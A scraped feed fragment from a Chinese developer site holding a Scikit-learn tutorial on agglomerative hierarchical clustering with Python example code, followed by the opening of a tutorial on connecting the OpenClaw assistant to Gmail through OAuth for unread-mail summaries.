<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.clawd.bot" target="_blank" title="https://docs.clawd.bot" ref="nofollow noopener noreferrer">官方文档</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【技术专题】Scikit-learn Python机器学习 - 聚类分析算法之Agglomerative Clustering（凝聚层次聚类）]]></title>    <link>https://juejin.cn/post/7602259669730476059</link>    <guid>https://juejin.cn/post/7602259669730476059</guid>    <pubDate>2026-02-03T04:16:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730476059" data-draft-id="7602303923140280370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【技术专题】Scikit-learn Python机器学习 - 聚类分析算法之Agglomerative Clustering（凝聚层次聚类）"/> <meta itemprop="keywords" content="人工智能,机器学习,Python"/> <meta itemprop="datePublished" content="2026-02-03T04:16:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小锋java1234"/> <meta itemprop="url" content="https://juejin.cn/user/4152222342709933"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【技术专题】Scikit-learn Python机器学习 - 聚类分析算法之Agglomerative Clustering（凝聚层次聚类）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4152222342709933/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小锋java1234
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:16:27.000Z" title="Tue Feb 03 2026 04:16:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是锋哥。最近连载更新《Scikit-learn Python机器学习》技术专题。 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdd5ef39ae6f428aa3fd01fd164b9dd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=6ll6CDbpJE3382pjN1WX8gUD%2Fsk%3D" alt="image.png" loading="lazy"/> 本课程主要讲解基于Scikit-learn的Python机器学习知识，包括机器学习概述，特征工程(数据集，特征抽取，特征预处理，特征降维等)，分类算法(K-临近算法，朴素贝叶斯算法，决策树等)，回归与聚类算法(线性回归，欠拟合，逻辑回归与二分类，K-means算法)等。 同时也配套视频教程<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV11reUzEEPH%2F" title="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV11reUzEEPH%2F" target="_blank">《Scikit-learn Python机器学习 视频教程》</a></p>
<p><strong>Agglomerative Clustering（凝聚层次聚类）</strong> 是一种自底向上的层次聚类方法，属于无监督学习的一种。它通过逐步将最相似的样本合并成一个簇（cluster），最终得到一个包含所有样本的簇，形成一个层次结构（树状图）。与其他聚类方法（如K-means）不同，凝聚层次聚类不需要事先指定簇的数量。</p>
<h2 data-id="heading-0">算法原理</h2>
<p>凝聚层次聚类的核心思想是基于距离（或相似度）度量来逐步合并样本或簇。</p>
<p>步骤</p>
<ol start="0">
<li>
<p><strong>初始化：</strong> 每个样本初始化为一个簇。</p>
</li>
<li>
<p><strong>计算距离：</strong> 计算每对簇之间的距离（或相似度）。距离计算方法可以有不同的选择，常见的有：</p>
<ul>
<li><strong>单链接（Single Linkage）：</strong> 两个簇之间的最小距离（即簇间最近的两个样本之间的距离）。</li>
<li><strong>完全链接（Complete Linkage）：</strong> 两个簇之间的最大距离（即簇间最远的两个样本之间的距离）。</li>
<li><strong>均值链接（Average Linkage）：</strong> 两个簇之间的平均距离。</li>
<li><strong>中心链接（Centroid Linkage）：</strong> 两个簇之间的中心点距离。</li>
</ul>
</li>
<li>
<p><strong>合并最近的簇：</strong> 选择距离最小的两个簇，合并成一个新的簇。</p>
</li>
<li>
<p><strong>重复步骤2和3：</strong> 不断计算簇间距离并合并，直到所有样本合并为一个簇或达到预设的簇数。</p>
</li>
<li>
<p><strong>树状图（Dendrogram）：</strong> 最终生成的聚类结果可通过树状图表示，显示了不同样本和簇的合并顺序。</p>
</li>
</ol>
<h2 data-id="heading-1">凝聚层次聚类的数学公式</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28f534f87a844fcdbbd51a38c298cbb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=UrezkJ8%2BsyF2IUfuZ3M8vlun4mA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1631520205714867bc47d9c96895a49d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=n3Ktmt9SrHpWxGNOkcE1qC045Ls%3D" alt="image.png" loading="lazy"/>
我们看一个示例：</p>
<p>假设我们有以下二维数据点：</p>



































<table><thead><tr><th>样本</th><th>x<em>x</em></th><th>y<em>y</em></th></tr></thead><tbody><tr><td>A</td><td>1</td><td>2</td></tr><tr><td>B</td><td>1.5</td><td>1.8</td></tr><tr><td>C</td><td>5</td><td>8</td></tr><tr><td>D</td><td>8</td><td>8</td></tr><tr><td>E</td><td>1</td><td>1</td></tr></tbody></table>
<p><strong>步骤1：</strong> 计算每一对数据点之间的距离（例如使用欧几里得距离）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adb963f9d96e4a49b3e9fea24799559c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=vUE16ffx2s8XCzAEqkweGS3j8h8%3D" alt="image.png" loading="lazy"/></p>
<p>...（继续计算其他距离）</p>
<p><strong>步骤2：</strong> 找到距离最小的两个点或簇。假设 A<em>A</em> 和 B<em>B</em> 之间的距离最小，我们首先将 A<em>A</em> 和 B<em>B</em> 合并为一个簇。</p>
<p><strong>步骤3：</strong> 计算新簇与其他数据点的距离，并重复步骤2和3直到所有数据点合并为一个簇。</p>
<h2 data-id="heading-2">API介绍</h2>
<p>在Scikit-learn中，<code>AgglomerativeClustering</code> 类可以实现凝聚层次聚类。</p>
<pre><code class="hljs language-ini" lang="ini">AgglomerativeClustering(
    <span class="hljs-attr">n_clusters</span>=<span class="hljs-number">2</span>,              <span class="hljs-comment"># 最重要的参数：聚类数量</span>
    *,                         <span class="hljs-comment"># 后面必须使用关键字参数</span>
    <span class="hljs-attr">metric</span>=<span class="hljs-string">'euclidean'</span>,        <span class="hljs-comment"># 距离度量方法</span>
    <span class="hljs-attr">linkage</span>=<span class="hljs-string">'ward'</span>,            <span class="hljs-comment"># 链接准则</span>
    <span class="hljs-attr">distance_threshold</span>=None,   <span class="hljs-comment"># 距离阈值（替代n_clusters）</span>
    <span class="hljs-attr">compute_full_tree</span>=<span class="hljs-string">'auto'</span>,  <span class="hljs-comment"># 是否计算完整树</span>
    <span class="hljs-attr">compute_distances</span>=<span class="hljs-literal">False</span>    <span class="hljs-comment"># 是否计算距离</span>
)
</code></pre>
<p>核心参数介绍：</p>
<ol start="0">
<li><code>n_clusters</code> - 聚类数量</li>
</ol>
<ul>
<li><strong>作用</strong>：指定最终要形成的簇的数量</li>
<li><strong>类型</strong>：int</li>
<li><strong>默认值</strong>：2</li>
</ul>
<ol start="2">
<li><code>metric</code> - 距离度量</li>
</ol>
<ul>
<li>
<p><strong>作用</strong>：定义数据点之间的距离计算方法</p>
</li>
<li>
<p><strong>常用选项</strong>：</p>
<ul>
<li><code>'euclidean'</code>：欧几里得距离（默认）</li>
<li><code>'manhattan'</code>：曼哈顿距离</li>
<li><code>'cosine'</code>：余弦距离</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>linkage</code> - 链接准则</li>
</ol>
<ul>
<li>
<p><strong>作用</strong>：定义簇与簇之间的合并策略</p>
</li>
<li>
<p><strong>常用选项</strong>：</p>
<ul>
<li><code>'ward'</code>：沃德法（默认，最小化方差）</li>
<li><code>'complete'</code>：全链接（最大距离）</li>
<li><code>'average'</code>：平均链接</li>
<li><code>'single'</code>：单链接（最小距离）</li>
</ul>
</li>
</ul>
<ol start="4">
<li><code>distance_threshold</code> - 距离阈值</li>
</ol>
<ul>
<li><strong>作用</strong>：当簇间距离超过此值时停止合并</li>
<li><strong>类型</strong>：float 或 None</li>
<li><strong>注意</strong>：设置此参数时，<code>n_clusters</code> 必须为 None</li>
</ul>
<h2 data-id="heading-3">具体示例</h2>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt
from sklearn.cluster import AgglomerativeClustering
from sklearn.datasets import make_blobs
from sklearn.metrics import silhouette_score
import scipy.cluster.hierarchy as sch
​
<span class="hljs-comment"># 设置中文字体支持</span>
plt.rcParams<span class="hljs-section">['font.sans-serif']</span> = <span class="hljs-section">['SimHei']</span>  <span class="hljs-comment"># 用来正常显示中文标签</span>
plt.rcParams<span class="hljs-section">['axes.unicode_minus']</span> = False  <span class="hljs-comment"># 用来正常显示负号</span>
<span class="hljs-comment"># 生成示例数据</span>
X, <span class="hljs-attr">y_true</span> = make_blobs(n_samples=<span class="hljs-number">300</span>, centers=<span class="hljs-number">4</span>, cluster_std=<span class="hljs-number">0.60</span>, random_state=<span class="hljs-number">0</span>)
​
<span class="hljs-comment"># 应用凝聚层次聚类</span>
<span class="hljs-attr">agg_clustering</span> = AgglomerativeClustering(n_clusters=<span class="hljs-number">4</span>, linkage=<span class="hljs-string">'ward'</span>)
<span class="hljs-attr">y_pred</span> = agg_clustering.fit_predict(X)
​
<span class="hljs-comment"># 评估聚类效果</span>
<span class="hljs-attr">silhouette_avg</span> = silhouette_score(X, y_pred)
print(f"轮廓系数: {silhouette_avg:.3f}")
​
<span class="hljs-comment"># 可视化结果</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">15</span>, <span class="hljs-number">5</span>))
​
<span class="hljs-comment"># 原始数据</span>
plt.subplot(1, 3, 1)
plt.scatter(X<span class="hljs-section">[:, 0]</span>, X<span class="hljs-section">[:, 1]</span>, <span class="hljs-attr">c</span>=y_<span class="hljs-literal">true</span>, cmap=<span class="hljs-string">'viridis'</span>)
plt.title('原始数据 (真实标签)')
​
<span class="hljs-comment"># 聚类结果</span>
plt.subplot(1, 3, 2)
plt.scatter(X<span class="hljs-section">[:, 0]</span>, X<span class="hljs-section">[:, 1]</span>, <span class="hljs-attr">c</span>=y_pred, cmap=<span class="hljs-string">'viridis'</span>)
plt.title('凝聚层次聚类结果')
​
<span class="hljs-comment"># 树状图</span>
plt.subplot(1, 3, 3)
<span class="hljs-attr">dendrogram</span> = sch.dendrogram(sch.linkage(X, method=<span class="hljs-string">'ward'</span>))
plt.title('树状图')
plt.xlabel('样本索引')
plt.ylabel('距离')
​
plt.tight_layout()
plt.show()
</code></pre>
<p>运行结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de16995c854f4111951a704ee25091d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6ZSLamF2YTEyMzQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696989&amp;x-signature=v3a4l8O6HM78zl%2FFzQk00hUkgRM%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw (原 Moltbot) Gmail 集成教程：邮件自动化与每日摘要]]></title>    <link>https://juejin.cn/post/7602166907572437030</link>    <guid>https://juejin.cn/post/7602166907572437030</guid>    <pubDate>2026-02-03T05:23:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602166907572437030" data-draft-id="7602206323460456499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw (原 Moltbot) Gmail 集成教程：邮件自动化与每日摘要"/> <meta itemprop="keywords" content="OpenAI,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T05:23:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Bi"/> <meta itemprop="url" content="https://juejin.cn/user/852876756274749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw (原 Moltbot) Gmail 集成教程：邮件自动化与每日摘要
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/852876756274749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Bi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:23:49.000Z" title="Tue Feb 03 2026 05:23:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本文演示如何使用 OpenClaw（原名 Moltbot/Clawdbot）实现 Gmail 邮件自动化管理。你将学会完成 OAuth 授权、筛选重要邮件、生成摘要，并配置定时推送，让邮件处理更省心。</p>
<h2 data-id="heading-1">前置条件</h2>
<ol>
<li>已安装 OpenClaw，并完成频道接入（可参考： <a href="https://juejin.cn/post/7600752623068102666" target="_blank" title="https://juejin.cn/post/7600752623068102666">OpenClaw（原 Moltbot）安装教程：从 0 搭建本地 AI 助手</a>）</li>
<li>拥有 Google 账号（Gmail 邮箱）</li>
</ol>
<h2 data-id="heading-2">集成</h2>
<h3 data-id="heading-3">确定方案</h3>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c49313d53b2496c84d79dabc4bab65a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=%2BD5c9gOBH0%2BUuLId0us785r4fm8%3D" alt="OpenClaw设置Gmail" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    OpenClaw设置Gmail
  </figcaption>
</figure>
<p>可以直接跟 OpenClaw 说下面这段话帮忙设置 Gmail：</p>
<pre><code class="hljs language-bash" lang="bash">Set up Gmail integration <span class="hljs-keyword">for</span> email management
</code></pre>
<p>这里我选择的是方案 2：<strong>Gmail API + OAuth</strong>。这是 OpenClaw 最推荐的做法，下面是 OpenClaw 回复的操作方案：</p>
<pre><code class="hljs language-bash" lang="bash">方案 2 的落地步骤（我们就按这个来）

我会在这台 Clawdbot 服务器上做：

1. 写一个脚本：拉取 Gmail 未读邮件（From/Subject/时间/正文摘要/链接）
2. 设置定时：每 X 分钟检查一次
3. 把摘要推送给你（Telegram）
你需要做的 2 件事

A. 创建 Google OAuth 客户端

1. 打开 Google Cloud Console → 创建项目
2. APIs &amp; Services → Enable APIs → 启用 Gmail API
3. Credentials → Create Credentials → OAuth client ID
类型选 “Desktop App”（最省事）
4. 下载生成的 client_secret_*.json
B. 把这个 json 发给我

• 最好用 Telegram 直接发 文件（不要粘贴在消息里）
• 我会把它放到服务器的 secrets/ 并只用于 OAuth 授权
我不会要你的 Gmail 密码，也不需要你给 2FA 验证码。



我还需要你确认 3 个设置（我才能一次配好）

1. 只读够不够？还是你想我也能 打标签/标记已读？（默认：只读）
2. 推送频率：每 5/15/30/60 分钟一次？
3. 推送规则：  • 只推 “未读且重要（Primary）”
  • 还是推所有未读（含 Promotions/Social）？

你回我这 3 个答案 + 把 client_secret_*.json 发过来，我就开始在服务器上搭脚本和定时任务。
</code></pre>
<h3 data-id="heading-4">Google Cloud Console 配置</h3>
<p>具体实现方案如下：</p>
<ol>
<li>打开 Google Cloud Console 第一次需要先创建项目 (<a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.cloud.google.com%2F" target="_blank" title="https://console.cloud.google.com/" ref="nofollow noopener noreferrer">console.cloud.google.com/</a>).</li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df68b0172504473e977c910ab07b458f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=r4r7jy5ZoybrVHTvfdT8uSfUm%2FE%3D" alt="Google Cloud Console 主页" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Google Cloud Console 主页
  </figcaption>
</figure>
<ol start="2">
<li>选择 <strong>API 和服务（APIs &amp; Services）</strong>，点击 <strong>启用 API 和服务</strong></li>
</ol>
<figure class="my-6">
